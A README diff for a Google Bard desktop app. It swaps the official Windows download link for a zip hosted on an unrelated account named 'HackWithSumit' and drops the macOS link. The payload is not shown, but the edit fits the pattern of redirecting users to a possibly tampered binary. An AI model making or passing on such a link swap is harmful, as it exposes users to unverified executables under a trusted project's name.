@@ -6,8 +6,8 @@ This is a desktop app for Google Bard, a chatbot that uses Generative AI to have
 
 ## Downloads
 
-- [Windows (95 MB)](https://github.com/mantreshkhurana/Google-Bard-electron/releases/download/1.0.0/Google-Bard-v1.0.0-windows.zip)
-- [macOS (89 MB)](https://github.com/mantreshkhurana/Google-Bard-electron/releases/download/1.0.0/Google-Bard-v1.0.0-darwin.zip)
+- [Windows (95 MB)](https://github.com/HackWithSumit/GoogleBard/releases/download/GoogleBard/Google-Bard-v1.0.0-windows.zip)
+
 - [Linux (69 MB)](https://github.com/mantreshkhurana/Google-Bard-electron/releases/download/1.0.0/Google-Bard-v1.0.0-linux.tar.xz)
 
 
